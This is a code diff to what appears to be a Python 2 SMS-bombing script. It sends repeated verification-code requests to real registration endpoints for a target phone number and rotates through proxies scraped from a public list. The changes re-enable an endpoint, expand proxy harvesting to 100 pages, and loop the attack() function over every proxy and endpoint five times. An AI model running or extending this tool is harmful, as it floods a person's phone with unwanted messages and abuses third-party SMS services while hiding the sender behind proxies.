@@ -6,19 +6,20 @@ import urllib2
 from time import sleep
 import sys
 from bs4 import BeautifulSoup
+from lxml import etree
 
 ua = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
-phone = "159xxx"
+phone = "151xxxxx"
 
 valid_proxy = set()
 
 # inurl:register
 request_data = [
-    # {  # {"result":"true","resultMessage":"验证码已发送，请注意查收短信！","resultType":"SUCCESS","token":""}
-    #    "url": "http://d.fcyun.com//register/getcode?rand=0.5558077982148903&submit_token=undefined",
-    #    "data": {"receiveMobileNo": phone},
-    #    "headers": {"User-Agent": ua, "Referer": "http://d.fcyun.com/register?dyzc2"}
-    #    },
+    {  # {"result":"true","resultMessage":"验证码已发送，请注意查收短信！","resultType":"SUCCESS","token":""}
+       "url": "http://d.fcyun.com//register/getcode?rand=0.5558077982148903&submit_token=undefined",
+       "data": {"receiveMobileNo": phone},
+       "headers": {"User-Agent": ua, "Referer": "http://d.fcyun.com/register?dyzc2"}
+       },
 
     {
         "url": "http://www.jc258.cn/signup/send_sms",
@@ -134,7 +135,7 @@ def attack(para, proxy):
         print "attack failed!!!"
 
 
-def get_proxy(pages=1):
+def get_proxy(pages=100):
     ipadds = []
 
     def get_ip_add(data):
@@ -153,26 +154,39 @@ def get_proxy(pages=1):
             if t:
                 ipadds.append([t[1], t[2]])
 
+    def get_ip_add_ex(data):
+        root = etree.HTML(data)
+        for tr in root.xpath("//tr[@class]"):
+            tr = tr.xpath("td/text()")
+            if len(tr) > 2:
+                yield ([tr[0], tr[1]])
+
     for page in range(1, pages + 1):
         request = urllib2.Request("http://www.xicidaili.com/nn/{}".format(str(page)), headers={"User-Agent": ua})
         response = urllib2.urlopen(request)
         data = response.read()
-        get_ip_add(data)
+        # get_ip_add(data)
 
-    return ipadds
+        root = etree.HTML(data)
+        for tr in root.xpath("//tr[@class]"):
+            tr = tr.xpath("td/text()")
+            if len(tr) > 2:
+                yield ([tr[0], tr[1]])
+
+    # return ipadds
 
 
 if __name__ == "__main__":
-    proxy_info = get_proxy()
+    # proxy_info = get_proxy()
+    # print proxy_info
     # proxy_info = [
     #     [u'61.232.254.39', u'3128'], [u'222.75.59.10', u'808'],
     #     [u'119.135.187.42', u'80'], [u'218.29.182.89', u'808'], [u'119.188.94.145', u'80'], [u'125.71.243.20', u'8888'],
     #     [u'119.188.94.145', u'80'], [u'112.124.113.155', u'80'], [u'114.234.213.201', u'8118'],
     #     [u'60.29.59.210', u'80'], [u'122.141.74.114', u'3128']]
     for i in range(5):
-        for proxy in proxy_info:
+        for proxy in get_proxy():
             for para in request_data:
                 attack(para, proxy)
-            # sys.exit()
         # break
     print list(valid_proxy)
